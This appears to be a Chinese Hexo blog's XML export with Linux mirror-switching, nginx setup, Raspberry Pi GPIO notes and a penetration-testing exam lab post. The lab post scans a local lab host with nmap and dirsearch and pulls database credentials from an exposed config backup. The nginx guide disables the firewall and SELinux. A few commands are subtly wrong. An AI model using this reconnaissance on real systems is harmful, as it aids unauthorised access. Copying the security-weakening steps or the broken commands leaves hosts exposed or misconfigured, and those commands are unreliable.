    <content><![CDATA[<h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><ul>
<li><strong>1.备份</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>2.下载新的 <code>CentOS-Base.repo</code> 到<code> /etc/yum.repos.d/</code></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>3.运行 <code>yum makecache </code>生成缓存</strong></p>
</li>
<li><p><strong>4.其他</strong></p>
</li>
</ul>
<p>**非阿里云ECS用户会出现 Couldn’t resolve host ‘mirrors.cloud.aliyuncs.com’ 信息，不影响使用。用户也可自行修改相关配置: **</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">&#x27;/mirrors.cloud.aliyuncs.com/d&#x27;</span> -e <span class="string">&#x27;/mirrors.aliyuncs.com/d&#x27;</span> /etc/yum.repos.d/CentOS-Base.repo</span><br></pre></td></tr></table></figure>

<h2 id="raspberry"><a href="#raspberry" class="headerlink" title="raspberry"></a>raspberry</h2><ul>
<li><strong>1.备份</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/apt/sources.list etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>2.换源，编辑<code>/etc/apt/sources.list</code></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/apt/sources.list &lt; EOF</span><br><span class="line">deb http://mirrors.huaweicloud.com/debian/ buster main non-free contrib</span><br><span class="line">deb http://mirrors.huaweicloud.com/debian-security buster/updates main</span><br><span class="line">deb http://mirrors.huaweicloud.com/debian/ buster-updates main non-free contrib</span><br><span class="line">deb http://mirrors.huaweicloud.com/debian/ buster-backports main non-free contrib</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>3.更新</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>picow_玩法和心得</title>
    <url>/2023/05/17/picow-%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="06b0978ec69af61104be055771b4714c7b126b87d1192af3e009afe58a0d6369"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx暑假实训</title>
    <url>/2022/07/13/nginx%E6%9A%91%E5%81%87%E5%AE%9E%E8%AE%AD/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="1-Nginx-安装"><a href="#1-Nginx-安装" class="headerlink" title="1.Nginx 安装"></a>1.Nginx 安装</h2><h3 id="一、安装编译工具及库文件"><a href="#一、安装编译工具及库文件" class="headerlink" title="一、安装编译工具及库文件"></a>一、安装编译工具及库文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装编译环境:gcc gcc-c++</span></span><br><span class="line"><span class="comment">#安装openssl-devel（使nginx支持ssl）</span></span><br><span class="line"><span class="comment">#安装lib</span></span><br><span class="line">yum -y install make zlib zlib-devel gcc gcc-c++ libtool  openssl openssl-devel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="二、首先要安装-PCRE"><a href="#二、首先要安装-PCRE" class="headerlink" title="二、首先要安装 PCRE"></a>二、首先要安装 PCRE</h3><p><strong>PCRE 作用是让 Nginx 支持 Rewrite 功能。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install pcre pcre-devel</span><br></pre></td></tr></table></figure>

<h3 id="三、安装-Nginx"><a href="#三、安装-Nginx" class="headerlink" title="三、安装 Nginx"></a>三、安装 Nginx</h3><p><strong>1、下载 Nginx，下载地址：<a href="https://nginx.org/en/download.html">https://nginx.org/en/download.html</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到nginx-1.22.0这个稳定包，下载下来，然后用rz上传到服务器</span></span><br></pre></td></tr></table></figure>

<p> <strong>2、解压安装包</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf nginx-1.22.0.tar.gz</span><br></pre></td></tr></table></figure>

<p><strong>3、进入安装包目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.22.0</span><br></pre></td></tr></table></figure>

<p><strong>4、编译</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/local/nginx</span><br></pre></td></tr></table></figure>

<p><strong>5、安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>6、查看nginx版本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -v</span><br></pre></td></tr></table></figure>

<h3 id="四、启动Nginx"><a href="#四、启动Nginx" class="headerlink" title="四、启动Nginx"></a>四、启动Nginx</h3><p><strong>进入安装好的目录&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./nginx           启动</span><br><span class="line">./nginx -s stop   快速关闭</span><br><span class="line">./nginx -s quit   优雅关闭，在退出前完成已经接受的连接请求</span><br><span class="line">./nginx -s reload 重新加载配置</span><br></pre></td></tr></table></figure>

<h3 id="五、关于防火墙和SELINUX"><a href="#五、关于防火墙和SELINUX" class="headerlink" title="五、关于防火墙和SELINUX"></a>五、关于防火墙和SELINUX</h3><p><strong>关闭防火墙</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>

<p><strong>禁止防火墙开机自启</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭SELINUX</span></span><br><span class="line">sed -ri <span class="string">&#x27;/^SELINUX=/cSELINUX=disabled&#x27;</span> /etc/selinux/config</span><br><span class="line"><span class="comment">#修改完成之后重启服务器，然后getenforce看看</span></span><br><span class="line"><span class="comment">#当然如果不想重启服务器也可以先修改好配置，然后用 setenforce 0来临时关闭SELINUX，下次重启自然会识别配置文件了。</span></span><br><span class="line">[root@localhost ~]<span class="comment"># setenforce 0</span></span><br><span class="line">[root@localhost ~]<span class="comment"># getenforce </span></span><br><span class="line">Permissive</span><br></pre></td></tr></table></figure>

<h3 id="六、添加systemctl管理"><a href="#六、添加systemctl管理" class="headerlink" title="六、添加systemctl管理"></a>六、添加systemctl管理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /usr/lib/systemd/system/nginx.service</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=nginx</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=forking</span></span><br><span class="line"><span class="string">ExecStartPre=/bin/mkdir /tmp/nginx</span></span><br><span class="line"><span class="string">ExecStart=/usr/local/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">ExecReload=/usr/local/nginx/sbin/nginx -s reload</span></span><br><span class="line"><span class="string">ExecStop=/usr/local/nginx/sbin/nginx -s stop</span></span><br><span class="line"><span class="string">PrivateTmp=true</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<h3 id="七、创建环境变量"><a href="#七、创建环境变量" class="headerlink" title="七、创建环境变量"></a>七、创建环境变量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile.d/nginx.sh</span><br><span class="line"></span><br><span class="line">NGINX_HOME=/usr/local/nginx</span><br><span class="line">PATH=<span class="variable">$NGINX_HOME</span>/sbin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> NGINX_HOME PATH</span><br></pre></td></tr></table></figure>

<p><strong>source &#x2F;etc&#x2F;profile.d&#x2F;nginx.sh</strong></p>
<p><strong>启动nginx</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/nginx</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>

<h3 id="八、修改ip为静态地址"><a href="#八、修改ip为静态地址" class="headerlink" title="八、修改ip为静态地址"></a>八、修改ip为静态地址</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TYPE=<span class="string">&quot;Ethernet&quot;</span></span><br><span class="line">PROXY_METHOD=<span class="string">&quot;none&quot;</span></span><br><span class="line">BROWSER_ONLY=<span class="string">&quot;no&quot;</span></span><br><span class="line">DEFROUTE=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV4_FAILURE_FATAL=<span class="string">&quot;no&quot;</span></span><br><span class="line">IPV6INIT=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_AUTOCONF=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_DEFROUTE=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_FAILURE_FATAL=<span class="string">&quot;no&quot;</span></span><br><span class="line">IPV6_ADDR_GEN_MODE=<span class="string">&quot;stable-privacy&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">UUID=<span class="string">&quot;ff458f3b-f132-400d-ae06-86277ce43612&quot;</span></span><br><span class="line">DEVICE=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">ONBOOT=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPADDR=192.168.110.131         <span class="comment"># 静态ip地址</span></span><br><span class="line">NETMASK=255.255.255.0          <span class="comment"># 子网掩码</span></span><br><span class="line">GATEWAY=192.168.110.1          <span class="comment"># 网关地址</span></span><br><span class="line">BROADCAST=192.168.110.255      <span class="comment"># 广播地址</span></span><br><span class="line">BOOTPROTO=<span class="string">&quot;static&quot;</span>             <span class="comment"># 修改静态</span></span><br></pre></td></tr></table></figure>




<h2 id="2-Nginx的conf学习"><a href="#2-Nginx的conf学习" class="headerlink" title="2.Nginx的conf学习"></a>2.Nginx的conf学习</h2><p><strong>nginx.conf的配置如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#user  nobody;</span></span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">    <span class="comment">#                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">    <span class="comment">#                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 虚拟服务器 这里开始    </span></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#charset koi8-r;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    proxy_pass   http://127.0.0.1;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    root           html;</span></span><br><span class="line">        <span class="comment">#    fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment">#    fastcgi_index  index.php;</span></span><br><span class="line">        <span class="comment">#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span><br><span class="line">        <span class="comment">#    include        fastcgi_params;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># deny access to .htaccess files, if Apache&#x27;s document root</span></span><br><span class="line">        <span class="comment"># concurs with nginx&#x27;s one</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">        <span class="comment">#    deny  all;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 虚拟服务器 这里结束</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># another virtual host using mix of IP-, name-, and port-based configuration</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       8000;</span></span><br><span class="line">    <span class="comment">#    listen       somename:8080;</span></span><br><span class="line">    <span class="comment">#    server_name  somename  alias  another.alias;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTPS server</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       443 ssl;</span></span><br><span class="line">    <span class="comment">#    server_name  localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_certificate      cert.pem;</span></span><br><span class="line">    <span class="comment">#    ssl_certificate_key  cert.key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_session_cache    shared:SSL:1m;</span></span><br><span class="line">    <span class="comment">#    ssl_session_timeout  5m;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="line">    <span class="comment">#    ssl_prefer_server_ciphers  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p><strong>虚拟主机应用场景：一个WEB服务器同时发布多个WEB站点</strong></p>
<h5 id="用ip基于端口访问"><a href="#用ip基于端口访问" class="headerlink" title="用ip基于端口访问"></a>用ip基于端口访问</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在跟目录下放置www目录，然后内置两个目录，分别是www目录和void目录</span></span><br><span class="line"><span class="comment"># 写入不同的html页面</span></span><br><span class="line">[root@localhost /]<span class="comment"># cd www</span></span><br><span class="line">[root@localhost www]<span class="comment"># ls</span></span><br><span class="line">void  www</span><br><span class="line">[root@localhost www]<span class="comment"># cat void/index.html </span></span><br><span class="line">this is void web site...</span><br><span class="line">[root@localhost www]<span class="comment"># cat www/index.html </span></span><br><span class="line">this is www web site...</span><br><span class="line">[root@localhost www]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><strong>修改nginx.conf配置文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost www]<span class="comment"># vim /usr/local/nginx/conf/nginx.conf</span></span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;             <span class="comment">#网页访问端口80</span></span><br><span class="line">        server_name  localhost;</span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /www/www;         <span class="comment">#网址指定目录</span></span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       81;             <span class="comment">#网页访问端口81</span></span><br><span class="line">        server_name  localhost;</span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /www/void;         <span class="comment">#网址指定目录      </span></span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="用域名基于端口访问"><a href="#用域名基于端口访问" class="headerlink" title="用域名基于端口访问"></a>用域名基于端口访问</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost www]<span class="comment"># vim /usr/local/nginx/conf/nginx.conf</span></span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;             <span class="comment">#网页访问端口80</span></span><br><span class="line">        server_name  www.julintongxue.top;<span class="comment">#域名</span></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /www/www;         <span class="comment">#网址指定目录</span></span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       81;             <span class="comment">#网页访问端口81</span></span><br><span class="line">        server_name  void.julintongxue.top;<span class="comment">#域名</span></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /www/void;         <span class="comment">#网址指定目录      </span></span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>pte</title>
    <url>/2023/01/14/pte/</url>
    <content><![CDATA[<p>[toc]</p>
<p><strong>把下载好的<code>pte81-85</code>解压到&#x2F;root目录下，知道<code>pte81-85</code>解压后是一个<code>www</code>目录</strong></p>
<p><strong>将<code>tutum/apache-php</code>pull下来</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull tutum/apache-php</span><br></pre></td></tr></table></figure>

<p><strong>然后把<code>/root/www</code>下的每一个文件夹分别对应81，82，83，84，85这五个端口即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 81:80 --name=pte_81 -v /root/www/0x1oa/:/app  tutum/apache-php</span><br><span class="line">docker run -d -p 82:80 --name=pte_82 -v /root/www/md3oa/:/app  tutum/apache-php</span><br><span class="line">docker run -d -p 83:80 --name=pte_83 -v /root/www/mk2po/:/app  tutum/apache-php</span><br><span class="line">docker run -d -p 84:80 --name=pte_84 -v /root/www/oj5fp/:/app  tutum/apache-php</span><br><span class="line">docker run -d -p 85:80 --name=pte_85 -v /root/www/zo4m1/:/app  tutum/apache-php</span><br></pre></td></tr></table></figure>







<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -T4 -p- 192.168.241.134</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/14/pte/image-20230114194132350.png" alt="image-20230114194132350"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.241.134:27689</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/14/pte/image-20230114194559985.png" alt="image-20230114194559985"></p>
<p><strong>看<code>/robots.txt</code>和<code>/web.config.bak</code>通过<code>/web.config.bak</code>可得知数据库的账号和密码</strong></p>
<p><img src="/2023/01/14/pte/image-20230114195354272.png" alt="image-20230114195354272"></p>
<ul>
<li><strong>账号:down</strong></li>
<li><strong>密码:downsql</strong></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>python爬虫和数据分析</title>
    <url>/2023/03/17/python%E7%88%AC%E8%99%AB%E5%92%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="e26d368858ed2ac5d21dc7e350748adcfa90da43c45d980db060e7d10011ef9c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python爬虫</tag>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry-400</title>
    <url>/2023/03/16/raspberry-400/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h1><h1 id="更换系统源"><a href="#更换系统源" class="headerlink" title="更换系统源"></a>更换系统源</h1><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/">清华大学源</a></p>
<p>如何添加armv7l架构源，很简单，只需编辑<code>/etc/apt/sources.list</code>，并且无需额外的服务或者整机的重启操作。</p>
<p>先注释掉所有语句，然后加入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ bullseye main non-free contrib rpi</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ bullseye main non-free contrib rpi</span><br><span class="line">deb [<span class="built_in">arch</span>=arm64] https://mirrors.tuna.tsinghua.edu.cn/raspbian/multiarch/ bullseye main</span><br></pre></td></tr></table></figure>

<p>第一行是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">选择你的 Raspbian 对应的 Debian 版本： Debian 11 (bullseye) Debian 10 (buster) Debian 9 (stretch) </span><br></pre></td></tr></table></figure>

<p>第二行是：</p>
<p>源码目录仓库是否开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">启用源码镜像：是 </span><br></pre></td></tr></table></figure>

<p>第三行是：</p>
<p>为arm64和aarch64提供deb包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">启用 multi-arch aarch64：是</span><br></pre></td></tr></table></figure>

<p>然后更新软件列表和软件即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>如果出现证书问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpg --keyserver keyserver.ubuntu.com --recv-keys [报错的公钥]</span><br></pre></td></tr></table></figure>

<p>如果还想加入aarch64架构的源也可这样，编辑 <code>/etc/apt/sources.list.d/raspi.list</code> 文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ bullseye main</span><br></pre></td></tr></table></figure>

<p>然后更新软件列表和软件即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h1 id="树莓派实验"><a href="#树莓派实验" class="headerlink" title="树莓派实验"></a>树莓派实验</h1><h2 id="RPI-GPIO-使用手册"><a href="#RPI-GPIO-使用手册" class="headerlink" title="RPI.GPIO 使用手册"></a>RPI.GPIO 使用手册</h2><h3 id="RPI-GPIO包介绍"><a href="#RPI-GPIO包介绍" class="headerlink" title="RPI.GPIO包介绍"></a>RPI.GPIO包介绍</h3><p><strong>RPi.GPIO 模块程序包提供了一个在 Raspberry Pi 中控制 GPIO 的类。</strong></p>
<p>**RPi.GPIO是 Python的一个module( 模块 ), 树莓派官方系统默认已经安装, 仍在不断更新中，可以访问 <a href="https://pypi.python.org/pypi/RPi.GPIO">python主页下载源码</a> **</p>
<p><img src="/2023/03/16/raspberry-400/image-20230412210044844.png" alt="image-20230412210044844"></p>
<p><strong>注意，该模块不适合应用到追求实时性或计数周期的应用中。这是由于您无法预测 Ptyhon 何时繁忙，以及资源回收的时间。而且它是运行在基于 Linux 核心的系统中，也不合适用于实时应用 – 原因在于其它进程可能获得更高的 CPU 优先级。</strong></p>
<p><a href="https://sourceforge.net/p/raspberry-gpio-python/wiki/Home/">官方的帮助文档的链接：</a></p>
<p><img src="/2023/03/16/raspberry-400/image-20230412210406116.png" alt="image-20230412210406116"></p>
<p><img src="/2023/03/16/raspberry-400/image-20230412210518012.png" alt="image-20230412210518012"></p>
<h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br></pre></td></tr></table></figure>

<p><strong>通过这样，您可以在脚本的其余部分中将其称为 GPIO。</strong></p>
<p><strong>要导入模块并检查它是否成功，请执行以下操作：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    import RPi.GPIO as GPIO</span><br><span class="line">except RuntimeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error importing RPi.GPIO!  This is probably because you need superuser privileges.  You can achieve this by using &#x27;sudo&#x27; to run your script&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">解释：try except异常捕获处理</span><br><span class="line">RuntimeError是运行时错误，如果触发这个就会打印后面<span class="built_in">print</span>里面的话</span><br></pre></td></tr></table></figure>

<h3 id="引脚编号"><a href="#引脚编号" class="headerlink" title="引脚编号"></a>引脚编号</h3><p><strong>在RPi.GPIO中，有两种方法可以对Raspberry Pi上的IO引脚进行编号。</strong></p>
<p><strong>第一种是使用BOARD编号系统。这是指Raspberry Pi板上P1接头上的引脚号。使用这种编号系统的优点是，无论树莓派的电路板版本如何，您的硬件都能正常工作。你不需要重新连接你的连接器或更改你的代码。</strong></p>
